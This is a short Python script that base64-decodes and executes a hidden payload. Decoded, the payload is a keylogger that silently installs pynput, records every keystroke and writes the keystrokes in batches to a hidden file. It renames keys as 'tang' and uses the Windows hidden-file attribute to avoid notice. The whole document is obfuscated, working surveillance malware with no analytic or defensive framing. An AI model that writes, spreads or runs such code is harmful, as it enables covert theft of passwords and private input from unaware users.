import base64

kingen = "aW1wb3J0IG9zCmltcG9ydCBjdHlwZXMKaW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IHN5cwpmcm9tIHB5bnB1dC5rZXlib2FyZCBpbXBvcnQgS2V5LCBMaXN0ZW5lcgoKCiMgSGlkZGVuIGZpbGUgYXR0cmlidXRlCkZJTEVfQVRUUklCVVRFX0hJRERFTiA9IDB4MDIKCiMgVGFuZyBwcmVzcyBjb3VudGVyCmNvdW50ID0gMAoKIyBMaXN0IHRvIHN0b3JlIHRoZSBwcmVzc2VkIHRhbmcKdGFuZ3MgPSBbXQoKIyBDYWxsYmFjayBmdW5jdGlvbiB0byBoYW5kbGUgdGFuZyBwcmVzcyBldmVudHMKZGVmIG9uX3ByZXNzKHRhbmcpOgogICAgZ2xvYmFsIHRhbmdzLCBjb3VudAoKICAgIHRhbmdzLmFwcGVuZCh0YW5nKQogICAgY291bnQgKz0gMQoKICAgICMgUHJpbnQgdGhlIHByZXNzZWQgdGFuZyAob3B0aW9uYWwpCiAgICBwcmludCgiezB9IHByZXNzZWQiLmZvcm1hdCh0YW5nKSkKCiAgICAjIElmIHRoZSBudW1iZXIgb2YgcHJlc3NlcyByZWFjaGVzIDEwLCB3cml0ZSB0aGUgdGFuZ3MgdG8gZmlsZQogICAgaWYgY291bnQgPj0gMTA6CiAgICAgICAgY291bnQgPSAwCiAgICAgICAgd3JpdGVfZmlsZSh0YW5ncykKICAgICAgICB0YW5ncyA9IFtdCgojIENhbGxiYWNrIGZ1bmN0aW9uIHRvIGhhbmRsZSB0YW5nIHJlbGVhc2UgZXZlbnRzCmRlZiBvbl9yZWxlYXNlKHRhbmcpOgogICAgaWYgdGFuZyA9PSBLZXkuZXNjOgogICAgICAgIHJldHVybiBGYWxzZQoKIyBXcml0ZSB0aGUgcHJlc3NlZCB0YW5ncyB0byBmaWxlCmRlZiB3cml0ZV9maWxlKHRhbmdzKToKICAgICIiIgogICAgQ3Jvc3MtcGxhdGZvcm0gaGlkZGVuIGZpbGUgd3JpdGVyLgogICAgIiIiCiAgICAjIEZvciAqbml4IHN5c3RlbXMsIGFkZCBhICcuJyBwcmVmaXggdG8gdGhlIGZpbGUgbmFtZQogICAgcHJlZml4ID0gJy4nIGlmIG9zLm5hbWUgIT0gJ250JyBlbHNlICcnCiAgICBmaWxlX25hbWUgPSBwcmVmaXggKyAndGpvLnR4dCcKCiAgICAjIE9wZW4gdGhlIGZpbGUgaW4gYXBwZW5kIG1vZGUgYW5kIHdyaXRlIHRoZSB0YW5ncwogICAgd2l0aCBvcGVuKGZpbGVfbmFtZSwgJ2EnKSBhcyBmaWxlOgogICAgICAgIGZvciB0YW5nIGluIHRhbmdzOgogICAgICAgICAgICB0YW5nID0gc3RyKHRhbmcpLnJlcGxhY2UoIiciLCIiKQogICAgICAgICAgICAjIElmIHRoZSB0YW5nIGlzIHNwYWNlIG9yIGVudGVyLCB3cml0ZSBhIG5ld2xpbmUgY2hhcmFjdGVyCiAgICAgICAgICAgIGlmICdzcGFjZScgaW4gdGFuZyBvciAnZW50ZXInIGluIHRhbmc6CiAgICAgICAgICAgICAgICBmaWxlLndyaXRlKCdcbicpCiAgICAgICAgICAgICMgSWYgdGhlIHRhbmcgaXMgbm90IHJlY29nbml6ZWQsIHdyaXRlIGl0cyB2YWx1ZSBhcyBpcwogICAgICAgICAgICBlbGlmICdLZXknIG5vdCBpbiB0YW5nOgogICAgICAgICAgICAgICAgZmlsZS53cml0ZSh0YW5nKQoKICAgICMgRm9yIFdpbmRvd3Mgc3lzdGVtcywgc2V0IHRoZSBmaWxlIGFzIGhpZGRlbgogICAgaWYgb3MubmFtZSA9PSAnbnQnOgogICAgICAgIHJldCA9IGN0eXBlcy53aW5kbGwua2VybmVsMzIuU2V0RmlsZUF0dHJpYnV0ZXNXKGZpbGVfbmFtZSwgRklMRV9BVFRSSUJVVEVfSElEREVOKQogICAgICAgIGlmIG5vdCByZXQ6CiAgICAgICAgICAgIHJhaXNlIGN0eXBlcy5XaW5FcnJvcigpCgojIENoZWNrIGlmIHRoZSBgcHlucHV0YCBwYWNrYWdlIGlzIGluc3RhbGxlZApzdWJwcm9jZXNzLmNoZWNrX2NhbGwoW3N5cy5leGVjdXRhYmxlLCAnLW0nLCAncGlwJywgJ2luc3RhbGwnLCAncHlucHV0J10pCgojIFN0YXJ0IHRoZSB0YW5nIGxpc3RlbmVyCndpdGggTGlzdGVuZXIob25fcHJlc3M9b25fcHJlc3MsIG9uX3JlbGVhc2U9b25fcmVsZWFzZSkgYXMgbGlzdGVuZXI6CiAgICBsaXN0ZW5lci5qb2luKCkK"

exec(base64.b64decode(kingen))